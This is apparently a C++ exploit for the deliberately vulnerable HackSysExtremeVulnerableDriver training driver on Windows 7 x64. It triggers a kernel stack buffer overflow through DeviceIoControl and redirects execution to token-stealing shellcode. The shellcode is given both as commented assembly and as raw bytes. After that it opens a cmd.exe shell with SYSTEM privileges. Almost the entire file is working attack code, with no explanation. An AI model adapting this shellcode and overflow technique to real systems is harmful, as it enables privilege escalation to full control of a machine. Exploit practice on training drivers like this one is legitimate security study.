#include <iostream>
#include <stdio.h>
#include <Windows.h>
#include "../HEVDExploit/helper.h"

int main() {
	HANDLE hDevice = CreateFile(L"\\\\.\\HackSysExtremeVulnerableDriver",
		GENERIC_WRITE, FILE_SHARE_WRITE,
		nullptr, OPEN_EXISTING, 0,
		nullptr
	);
	if (hDevice == INVALID_HANDLE_VALUE) {
		return printf("Failed to open device");
	}


	/*
	Windows 7 x64 EoP shellcode (stealing token)
	xor eax, eax
	mov rax, gs:[rax + 188h]
	mov rax, [rax + 70h]

	mov rcx, rax
	mov r11, rcx
	and r11, 0x7
	mov rdx, 0x4

	SearchSystemPID:
	mov rax, [rax + 0x188]
	sub rax, 0x188
	cmp[rax + 0x180], rdx
	jne SearchSystemPID

	mov rdx, [rax + 0x208]
	and rdx, 0x0fffffffffffffff0
	or rdx, r11
	mov[rcx + 0x208], rdx

	xor eax, eax
	add rsp, 0x28
	ret

	*/

	char EoP[] = "\x31\xc0\x65\x48\x8b\x80\x88\x01\x00\x00\x48\x8b\x40\x70\x48\x89\xc1\x49\x89\xcb\x49\x83\xe3\x07\x48\xc7\xc2\x04\x00\x00\x00\x48\x8b\x80\x88\x01\x00\x00\x48\x2d\x88\x01\x00\x00\x48\x39\x90\x80\x01\x00\x00\x75\xea\x48\x8b\x90\x08\x02\x00\x00\x48\x83\xe2\xf0\x4c\x09\xda\x48\x89\x91\x08\x02\x00\x00\x31\xc0\x48\x83\xc4\x28\xc3";
	char* shellcode = (char*)VirtualAlloc(NULL, 0x1000, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if (shellcode == NULL) {
		printf("VirtualAlloc failed");
		return -1;
	}
	ULONG64* payload = (ULONG64*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, 0x1000);
	if (payload == NULL) {
		printf("HeapAlloc failed");
		return -1;
	}
	memset(payload, 0x61, 0x820);

	memcpy(shellcode, EoP, sizeof(EoP));
	payload[0x103] = (ULONG64)shellcode;

	DWORD returned;
	printf("UerBuffer = %p", payload);
	BOOL success = DeviceIoControl(hDevice,
		HEVD_IOCTL_BUFFER_OVERFLOW_STACK,
		payload, 0x830,
		nullptr, 0,
		&returned, nullptr
	);

	if (success) {
		printf("Overflow triggered");
		WinExec("C:\\Windows\\System32\\cmd.exe", SW_SHOWNORMAL);
	}
	else
		printf("Failed");

	CloseHandle(hDevice);

	return 0;
}